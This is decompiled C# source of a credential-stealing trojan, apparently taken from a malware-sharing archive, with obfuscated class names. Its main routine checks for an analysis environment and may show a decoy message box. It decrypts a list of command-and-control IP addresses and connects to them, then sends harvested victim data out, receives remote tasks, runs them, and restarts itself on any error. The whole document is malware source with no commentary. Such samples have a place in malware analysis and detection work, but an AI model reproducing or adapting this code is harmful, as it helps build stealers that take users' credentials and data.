// Decompiled with JetBrains decompiler
// Type: SystemConfigurationIdnElementUriIdnScopeTypeConverterr
// Assembly: Pursuits, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5AE29391-E6B0-4A11-8563-A9AF244B152D
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-Spy.MSIL.Stealer.gen-f5d5176d0ac8a6c9093f39208d3aff397cce06017bbf0f2e4fee86a5ce09a398.exe

using System;
using System.Collections.Generic;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;

public static class SystemConfigurationIdnElementUriIdnScopeTypeConverterr
{
  private static void Main(string[] args) => SystemConfigurationIdnElementUriIdnScopeTypeConverterr.WriteLine();

  public static void WriteLine()
  {
    try
    {
      if (MicrosoftWinNativeMethodsUSEROBJECTFLAGSy.Check())
        Environment.Exit(0);
      if (!string.IsNullOrWhiteSpace(dnlibDotNetEmitLocalListA.Message))
        Task.Factory.StartNew<MessageBoxResult>((Func<MessageBoxResult>) (() => MessageBox.Show(SystemNetSSPIWrapperX.Read(dnlibDotNetEmitLocalListA.Message, dnlibDotNetEmitLocalListA.Key), "", MessageBoxButton.OK, MessageBoxImage.Hand)));
      dnlibDotNetTypeDefMDMethodOverrideTokensy connection = new dnlibDotNetTypeDefMDMethodOverrideTokensy();
      bool flag = false;
      while (!flag)
      {
        string str = SystemNetSSPIWrapperX.Read(dnlibDotNetEmitLocalListA.IP, dnlibDotNetEmitLocalListA.Key);
        char[] chArray = new char[1]{ '|' };
        foreach (string address in str.Split(chArray))
        {
          if (connection.Id1(address))
          {
            flag = true;
            break;
          }
        }
        Thread.Sleep(5000);
      }
      dnlibDotNetWriterTablesHeapRawDummyRowU args = new dnlibDotNetWriterTablesHeapRawDummyRowU();
      while (!connection.Id5(out args))
      {
        if (!connection.Id3())
          throw new Exception();
        Thread.Sleep(1000);
      }
      SystemMediaSoundPlayerp result = new SystemMediaSoundPlayerp()
      {
        Id2 = SystemNetSSPIWrapperX.Read(dnlibDotNetEmitLocalListA.ID, dnlibDotNetEmitLocalListA.Key)
      };
      SystemCollectionsGenericSortedDictionaryValueCollectioncDisplayClassQ collectioncDisplayClassQ = SystemCollectionsSpecializedOrderedDictionaryI.Extract<SystemCollectionsGenericSortedDictionaryValueCollectioncDisplayClassQ>();
      while (!collectioncDisplayClassQ.Invoker(connection, args, ref result))
        Thread.Sleep(5000);
      SystemMediaSoundPlayerp user = result with
      {
        Id7 = new SystemNetNetworkingPerfCountersCounterPairO(),
        Id12 = (byte[]) null
      };
      IList<SystemSecurityCryptographyXCertificatesXEnhancedKeyUsageExtensionU> remoteTasks = (IList<SystemSecurityCryptographyXCertificatesXEnhancedKeyUsageExtensionU>) new List<SystemSecurityCryptographyXCertificatesXEnhancedKeyUsageExtensionU>();
      user.Id8 = "UNKNWON";
      while (!connection.Id26(user, out remoteTasks))
      {
        if (!connection.Id3())
          throw new Exception();
        Thread.Sleep(1000);
      }
      foreach (int releaseUpdate in new SystemNetNetworkInformationNetworkInformationPermissionAttributeY(result).ReleaseUpdates((IEnumerable<SystemSecurityCryptographyXCertificatesXEnhancedKeyUsageExtensionU>) remoteTasks))
      {
        while (!connection.Id27(user, releaseUpdate))
        {
          if (!connection.Id3())
            throw new Exception();
          Thread.Sleep(1000);
        }
      }
    }
    catch (Exception ex)
    {
      SystemConfigurationIdnElementUriIdnScopeTypeConverterr.WriteLine();
    }
  }
}
